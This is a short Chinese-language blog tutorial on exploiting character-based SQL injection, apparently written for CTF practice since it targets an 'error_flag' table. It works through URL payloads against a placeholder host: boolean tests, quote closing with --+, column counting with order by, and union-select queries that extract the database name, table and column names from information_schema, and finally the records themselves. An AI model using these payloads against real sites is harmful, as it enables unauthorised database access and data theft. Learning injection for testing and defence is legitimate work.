title: 字符型sql注入利用方法
author: weizhao
tags:
  - sql注入
categories:
  - 攻防
date: 2021-03-14 15:18:00
---
# 确定是否存在字符型sql注入
* __使用 and '1'='1 和 and '1'='2来判断：__

	Url 地址中输入 http://xxx/abc.php?id= 1' and '1'='1 页面运行正常，继续进行下一步。

　　Url 地址中继续输入 http://xxx/abc.php?id= 1' and '1'='2 页面运行错误，则说明此 Sql 注入为字符型注入
  
* 将单引号闭合
在url中使用“--+”将单引号闭合：
http://XXX/abc.php?id=1' and '1'='1'--+

__ 注意“--”后面要添加+号，sql语句会变为：
select *from user where id='1' and '1'='1'-- '__

* 判断当前表的列数：
http://xxx/abc.php?id=1' order by 1--+
利用order by语句判断，当按照第4列排序时页面返回异常，说明当前表为3列。

* 得到当前的数据库名称：
http://xxx/abc.php?id=1' and '1'='2' union select 1,2,database()--+
在页面上即可得到当前的数据库名称。

* 得到当前数据库包含的数据表：
http://xxx/abc.php?id=1' and '1'='2' union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1--+

	**此时的sql语句为：**
select *from user where id='1' and '1'='2' union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1-- '

得到第一个表的名称，继续使用limit 1,1得到下一个表的名称，一直到页面异常。

* 得到某个表包含的列及名称：
http://xxx/abc.php?id=1' and '1'='2' union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name='error_flag' limit 0,1--+

	**此时的sql语句为：**
    select *from user where id='1' and '1'='2' union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name='error_flag' limit 0,1-- '
    
   得到error_flag表的第一个列名，继续使用limit 得到表的每一个列名，直到页面异常。
  
 * 根据得到表的列及名称得到表的记录：
 http://xxx/abc.php?id=1' and '1'='2' union select 1,id,flag from error_flag limit 0,1 --+
 
使用limit依次得到表的每一条记录。
